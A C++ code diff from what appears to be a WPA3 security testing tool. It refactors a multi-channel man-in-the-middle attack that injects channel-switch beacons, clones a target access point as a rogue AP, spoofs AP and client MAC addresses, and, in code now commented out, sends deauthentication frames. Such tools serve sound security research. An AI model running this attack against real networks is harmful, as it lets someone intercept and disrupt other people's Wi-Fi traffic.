@@ -7,6 +7,7 @@
 
 #include "attacks/by_target/scan_AP.h"
 #include "attacks/DoS_hard/dos_helpers.h"
+#include "attacks/DoS_soft/channel_switch/channel_switch.h"
 #include "attacks/mc_mitm/wifi_util.h"
 #include "logger/error_log.h"
 #include "logger/log.h"
@@ -16,7 +17,6 @@ namespace wpa3_tester{
     using namespace std;
     using namespace chrono;
     using namespace Tins;
-    const std::string ap_suffix = "_AP";
 
     McMitm::McMitm(const string &r_client_iface,
                    const string &r_ap_iface,
@@ -24,9 +24,9 @@ namespace wpa3_tester{
                    const string &ap_mac,
                    const string &client_mac)
         : nic_real_mon(r_client_iface),
-          nic_real_ap(r_client_iface+ap_suffix),
+          nic_real_ap(AP_IFACE_PREFIX+r_client_iface),
           nic_rogue_mon(r_ap_iface),
-          nic_rogue_ap(r_ap_iface+ap_suffix),
+          nic_rogue_ap(AP_IFACE_PREFIX+r_ap_iface),
           ssid(ssid),
           ap_mac(ap_mac),
           client_mac(client_mac){
@@ -41,13 +41,17 @@ namespace wpa3_tester{
 
         const uint8_t new_channel = netconfig.rogue_channel;
         for (int i = 0; i < numpairs; ++i) {
+            //FIXME
+            CSA_attack::send_CSA_beacon(ap_mac, nic_real_mon , ssid,  netconfig.real_channel, new_channel);
+
             // Intel firmware requires first receiving a CSA beacon with a count of 2 or higher,
             // followed by one with a value of 1. When starting with 1 it errors out.
-            auto csa2 = append_csa(*beacon_copy, new_channel, 2);
+
+            /*auto csa2 = append_csa(*beacon_copy, new_channel, 2);
             sock_real->send(csa2, netconfig.real_channel);
 
             auto csa1 = append_csa(*beacon_copy, new_channel, 1);
-            sock_real->send(csa1, netconfig.real_channel);
+            sock_real->send(csa1, netconfig.real_channel);*/
         }
         log(LogLevel::INFO, "Injected %d CSA beacon pairs (moving stations to channel %d)", numpairs, new_channel);
     }
@@ -109,42 +113,41 @@ namespace wpa3_tester{
 
         hw_capabilities::run_cmd({"iw", "dev", nic_real_ap, "del"});
         hw_capabilities::run_cmd({"iw", "dev", nic_rogue_ap, "del"});
-        hw_capabilities::run_cmd({"ifconfig", nic_real_mon, "down"});
-        hw_capabilities::run_cmd({"ifconfig", nic_rogue_mon, "down"});
+        //hw_capabilities::run_cmd({"ip", "link", "set", nic_real_mon, "down"});
+        //hw_capabilities::run_cmd({"ip", "link", "set", nic_rogue_mon, "down"});
 
         // 2. Configure monitor mode on interfaces
-        exec({"iw","dev", nic_rogue_mon, "interface", "add", nic_rogue_ap, "type", "__ap"});
-        hw_capabilities::set_monitor_mode(nic_real_mon, 2000);
-        hw_capabilities::set_monitor_mode(nic_rogue_mon, 2000);
+
+        //exec({"iw","dev", nic_rogue_mon, "interface", "add", nic_rogue_ap, "type", "__ap"});
+        //hw_capabilities::set_monitor_mode(nic_real_mon, 2000);
+        //hw_capabilities::set_monitor_mode(nic_rogue_mon, 2000);
 
         //TODO why not in python?
-        hw_capabilities::run_cmd({"iw", "dev", nic_real_mon, "set", "channel", to_string(netconfig.real_channel)});
-        hw_capabilities::run_cmd({"iw", "dev", nic_rogue_mon, "set", "channel", to_string(netconfig.rogue_channel)});
+        //hw_capabilities::run_cmd({"iw", "dev", nic_real_mon, "set", "channel", to_string(netconfig.real_channel)});
+        //hw_capabilities::run_cmd({"iw", "dev", nic_rogue_mon, "set", "channel", to_string(netconfig.rogue_channel)});
 
-        hw_capabilities::run_cmd({"rfkill", "unblock", "wifi"});
+        //hw_capabilities::run_cmd({"rfkill", "unblock", "wifi"});
     }
 
-    void McMitm::run(const int timeout_sec) {
+    void McMitm::run(RunStatus& rs, const int timeout_sec) {
+
 
         const bool check_rogue_beacons = should_check_rogue_beacons();
 
         //  1 configure interfaces
         configure_interfaces();
-        const bool start_nic_real_ap = !hw_capabilities::set_monitor_active(nic_real_mon);
-
+        //FIXME set_monitor_active ničí channel ()
+        // const bool start_nic_real_ap = !hw_capabilities::set_monitor_active(nic_real_mon, netconfig.real_channel);
+        const bool start_nic_real_ap =  true;
         // 2. Set up the nic_real_mon interface and use it to find the target network.
         //    Make sure to use a recent backports driver package so we can capture
         //    and inject packets in monitor mode.
-
-        string bpf = "(wlan addr1 "+ap_mac.to_string()+") or (wlan addr2 "+ap_mac.to_string()+")";
-        bpf += " or (wlan addr1 "+client_mac.to_string()+") or (wlan addr2 "+client_mac.to_string()+")";
-        bpf = "(wlan type data or wlan type mgt) and ("+bpf+")";
 
         // Test monitor mode and get MAC address of the network
         attack_scan::ScanAP scan_ap{};
         scan_ap.bssid = ap_mac.to_string();
 
-        exec({"ifconfig", nic_real_mon, "up"});
+        exec({"ip", "link", "set", nic_real_mon, "up"});
         exec({"iw", "dev", nic_real_mon, "set", "channel", to_string(netconfig.real_channel)});
 
         beacon = attack_scan::RSN_scan(nic_real_mon, 20, scan_ap); //TODO hardcoded tscan_timeout
@@ -160,6 +163,11 @@ namespace wpa3_tester{
             log(LogLevel::WARNING, "Attack not yet tested against 5 GHz networks.");
         //netconfig.find_rogue_channel(); //TODO
 
+       /*         CSA_attack::check_vulnerable(
+        ap_mac, client_mac,
+        nic_real_mon, ssid,
+        netconfig.real_channel , netconfig.rogue_channel, 100, 7);*/
+
         // Get a probe response we can reuse to instantly reply to probe requests
         if (auto* ch_ie = beacon->search_option(Dot11ManagementFrame::DS_SET))
             const_cast<uint8_t*>(ch_ie->data_ptr())[0] = netconfig.rogue_channel;
@@ -171,36 +179,38 @@ namespace wpa3_tester{
 
         // Now that we know the AP channel, put the monitor interface in active ACK mode
         if (start_nic_real_ap) {
-            exec({"iw", "dev", nic_real_mon, "interface", "add", nic_real_ap, "type", "__ap", "addr", client_mac.to_string()});
+            exec({"iw", "dev", nic_real_mon, "interface", "add", nic_real_ap, "type", "managed"});
+            // raději postupně exec({"iw", "dev", nic_real_mon, "interface", "add", nic_real_ap, "type", "__ap", "addr"i, client_mac.to_string()});
             log(LogLevel::INFO, "Setting MAC address of %s to %s", nic_real_ap.c_str(), client_mac.to_string().c_str());
-            exec({"ifconfig", nic_real_ap,  "down"});
             hw_capabilities::set_macaddress(nic_real_ap, client_mac.to_string());
-            start_ap(nic_real_ap, nic_real_mon,  netconfig.real_channel, *beacon);
+            hw_capabilities::set_macaddress(nic_real_mon, client_mac.to_string());
+            start_ap(rs, nic_real_ap, nic_real_mon,  netconfig.real_channel, *beacon);
         } else {
             log(LogLevel::INFO, "Setting MAC address of %s to %s", nic_real_mon.c_str(), client_mac.to_string().c_str());
-            exec({"ifconfig", nic_real_ap,  "down"});
+            exec({"ip", "link", "set", nic_real_ap,  "down"});
             hw_capabilities::set_macaddress(nic_real_mon, client_mac.to_string());
             hw_capabilities::run_cmd({"iw", "dev", nic_real_mon, "set", "channel", to_string(netconfig.real_channel)});
-            exec({"ifconfig", nic_real_mon, "up"});
+            exec({"ip", "link", "set", nic_real_mon, "up"});
         }
 
-        exec({"ifconfig", nic_real_mon, "up"});
+        exec({"ip", "link", "set", nic_real_mon, "up"});
         hw_capabilities::run_cmd({"iw", "dev", nic_real_mon, "set", "channel", to_string(netconfig.real_channel)});
 
-        sock_real  = make_unique<MonitorSocket>(nic_real_mon);
+        string bpf = "(wlan addr1 "+ap_mac.to_string()+") or (wlan addr2 "+ap_mac.to_string()+")";
+        bpf += " or (wlan addr1 "+client_mac.to_string()+") or (wlan addr2 "+client_mac.to_string()+")";
+        bpf = "(wlan type data or wlan type mgt) and ("+bpf+")";
+
+        sock_real = make_unique<MonitorSocket>(nic_real_mon);
         sock_real->set_filter(bpf);
 
         // 3. Set up the rogue AP and interfaces
         log(LogLevel::INFO, "Setting MAC address of %s to %s", nic_rogue_ap.c_str(), ap_mac.to_string().c_str());
-        exec({"ifconfig", nic_rogue_mon, "down"});
+        exec({"ip", "link", "set", nic_rogue_mon, "down"});
         hw_capabilities::set_macaddress(nic_rogue_ap, ap_mac.to_string());
+        hw_capabilities::set_macaddress(nic_rogue_mon, ap_mac.to_string());
 
         // Set up a rogue AP that clones the target network
-        start_ap(nic_rogue_ap, nic_rogue_mon, netconfig.rogue_channel, *beacon);
-
-        exec({"ifconfig", nic_rogue_mon, "up"});
-        exec({"ifconfig", nic_rogue_ap, "up"});
-        hw_capabilities::run_cmd({"iw", "dev", nic_rogue_mon, "set", "channel", to_string(netconfig.rogue_channel)});
+        start_ap(rs, nic_rogue_ap, nic_rogue_mon, netconfig.rogue_channel, *beacon);
 
         sock_rogue  = make_unique<MonitorSocket>(nic_rogue_mon);
         sock_rogue->set_filter(bpf);
@@ -211,7 +221,7 @@ namespace wpa3_tester{
         // 4 Inject some CSA beacons to push victims to our channel
         send_csa_beacon(4);
 
-        Dot11Deauthentication deauth{};
+        /*Dot11Deauthentication deauth{};
         deauth.addr1(HWAddress<6>::broadcast);
         deauth.addr2(ap_mac);
         deauth.addr3(ap_mac);
@@ -265,7 +275,7 @@ namespace wpa3_tester{
                 log(LogLevel::WARNING, "WARNING: Didn't receive beacon from rogue AP for two seconds");
                 last_rogue_beacon = steady_clock::now();
             }
-        }
+        }*/
     }
 
     void McMitm::stop() {
